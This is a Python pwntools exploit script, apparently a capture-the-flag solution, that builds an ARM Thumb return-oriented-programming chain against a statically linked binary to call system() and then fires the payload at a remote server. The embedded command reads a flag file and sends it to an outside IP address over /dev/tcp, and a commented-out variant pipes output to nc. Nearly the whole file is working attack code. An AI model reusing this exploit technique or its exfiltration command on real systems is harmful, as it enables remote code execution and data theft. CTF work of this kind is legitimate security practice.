#!/usr/bin/env python3
from pwn import *
import os
import sys

context.binary = "./main_fixed"

# rops
rop_r1_t_adr = 0x0003777e # ; pop {r1, pc} !thumb
rop_mov_r0_r6_t_adr = 0x00010d2c  # ; mov r0,r6 / pop {r4, r5, r6, pc}
rop_add_r0_r4_t_adr = 0x0001fd74  # ; add r0, r4 / pop {r4, pc}
rop_mov_r0_r6_wr3_t_adr = 0x00010c2a  # ; mov r0, r6 ; pop {r3, r4, r5, r6, r7, pc}

rop_add_sp_0xc_t_adr = 0x00014532  # ; add sp,#0xc / pop {r4, r5, pc}
rop_add_sp_0x28_t_adr = 0x00040380  # ; add sp, #0x28 / pop {r4, pc}
rop_add_sp_0x14_t_adr = 0x00040242 # ; add sp, #0x14 / pop {r4, r5, pc}

rop_pop_lr_t_adr = 0x00045f5a  # ; pop.w {r4, lr} / nop.w / pop {r4, pc}

rop_mov_r0_r1_t_adr = 0x00022fde  # ; mov r0 r1 / bx lr

rop_ror_r0_t_adr = 0x0001db28  # ; rors r0, r6 / bx r3

rop_open_t_adr = 0x00021dac  # open
rop_system_t_adr = 0x00014c10  # system
rop_sice_t_adr = 0x00010424  # sice
rop_continue_main_t_adr = 0x000104be  # main cont
rop_exit_t_adr = 0x00014358  # exit fkt

rop_set_r0_t_adr = 0x00034f6c  # ; pop {r0, r6, pc}
rop_set_r3_t_adr = 0x00014c28  # ; pop {r3, pc}

location_bin_sh = 0x0004b004  # string "/bin/sh"
location_date = 0x0004ab60  # string "date +'%s'"

"""
What I want to have

This is a bit complicated actually, but essentially I can jump recursevly into pop instructions and fill my buffers with such

Open question is how I get control over the stack to inject my /dev/tty or similar

Okay. Helpful:
  - r8 seems to be set to the stackpointer at a known and stable offset from sp. 
    Assumption is 364 bytes after sp in func vuln
  - so overwrite stuff in r8
  - then r0 needs to be set to r8
    - see addr 0x00020ca8
       0x00020ca8               4046  mov r0, r8
       0x00020caa               02b0  add sp, 8
       0x00020cac           bde8f087  pop.w {r4, r5, r6, r7, r8, sb, sl, pc}
  - call open

non thumb:
  0x0003df1c : pop {r4, r6, r7, fp, ip, lr, pc}
    - doesn't pop r8, but sets lr and pc


What happens in the binary:
  - binary is fully statically linked and included libc functions have stack canaries
  - using the `system` function, binaries like date can be called
  - string `/bin/sh` is already provided at location $location_bin_sh
  - issue is:
    - before we can intervene stdout, stdin and stderr are closed (file pointers 0, 1 and 2)
    - we can recover those by calling into open with e.g. /dev/tty

How the rop chain works:

1. set r1 to 2 (RW)
2. use r6 as pointer into stack -> need to mov it into r0
3. (overflow might not be required anymore)
4. call open and use gadget to move sp by 0xc bytes
    a. move r1 into r0
    b. set r1 to 2
    c. repeat
5. call system with bin_sh location

"""

def build_add_r0_r4_t(r4=0):
    payload = p32(rop_add_r0_r4_t_adr + 1)
    payload += p32(r4)
    return payload

def build_lr(lr, r4=0):
    payload = p32(rop_pop_lr_t_adr + 1)
    payload += p32(0) + p32(lr) + p32(r4)
    return payload

def build_mov_r0_r6_t(r4=0, r5=0, r6=0):
    payload = p32(rop_mov_r0_r6_t_adr + 1)
    payload += p32(r4) + p32(r5) + p32(r6)
    return payload

def mov_r0_r1_t(pc):
    payload = build_lr(lr=pc)
    payload += p32(rop_mov_r0_r1_t_adr + 1)
    return payload

def call_open_t(next_pc):
    # set lr to next instruction after open
    payload = build_lr(lr=next_pc)
    payload += p32(rop_open_t_adr + 1)  # do open once
    return payload

def build_set_r0(r0, r6):
    payload = p32(rop_set_r0_t_adr + 1)
    payload += p32(r0) + p32(r6)
    return payload


if True:
    addr = "128.140.44.15"
    initial = "ls"
    server = f"nc {addr} 8337"

    cmd = initial + "|" + server
    cmd = f"bash -c \"cat /home/ctf/flag.txt >/dev/tcp/{addr}/8337\""
    print("cmd:", cmd)
    cmd = cmd.encode("ascii")

    payload = b"0" * 0x20
    payload += b"1" * 4

    # trying to execute rop_r1_t_adr in thumb mode
    # move r6 to r0
    payload += build_mov_r0_r6_t(r4=40, r6=8)
    payload += build_add_r0_r4_t()


    if False:  # set exit code manually
        payload += build_lr(rop_set_r0_t_adr + 1)
        payload += p32(rop_system_t_adr + 1)

        payload += p32(0) + p32(0)
        payload += p32(rop_exit_t_adr + 1)
    elif False:  # return value is error code from system
        payload += build_lr(rop_set_r3_t_adr + 1)
        payload += p32(rop_system_t_adr + 1)

        payload += p32(rop_exit_t_adr + 1)
        payload += p32(rop_ror_r0_t_adr + 1)
    else:
        payload += build_lr(rop_set_r3_t_adr + 1)
        payload += p32(rop_system_t_adr + 1)

        rop_mov_r1_r0_t_adr = 0x0001eb0e  # ; movs r1, r0 / bx lr
        rop_add_r1_r3_b_t_adr = 0x0003de3e  # add r1, r3 / blx r1

        payload += p32(rop_set_r3_t_adr + 1)
        payload += p32(rop_ror_r0_t_adr + 1)
        payload += p32(rop_exit_t_adr + 1)
        payload += p32(rop_pop_lr_t_adr + 1)
        payload += p32(0) + p32(rop_add_r1_r3_b_t_adr + 1) + p32(0)
        payload += p32(rop_mov_r1_r0_t_adr + 1)



    print(len(payload))

    payload += b"0" * ((40 + 40) - (len(payload) - 0x20))
    payload += cmd + b"\x00"

    print(f"Payload Length: {len(payload)}")

    assert(len(payload) < 340)
else:
    ...
    payload = b"0" * 0x192
    # with 0x200 bytes calls to system don't resolve
    ...
with open("/local-tmp/payload", "bw") as fp:
    fp.write(payload)

if True:
    r = remote("34.125.56.151", 2222, ssl=False)
    r.sendline(payload)
    r.interactive()
    exit()

#io = gdb.debug(context.binary.path, gdbscript="""
#source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
#b *0x00021dac
#b *0x010488
#b *0x00014c10
#c
#""")
io = process(context.binary.path)
io.sendline(payload)
io.interactive()
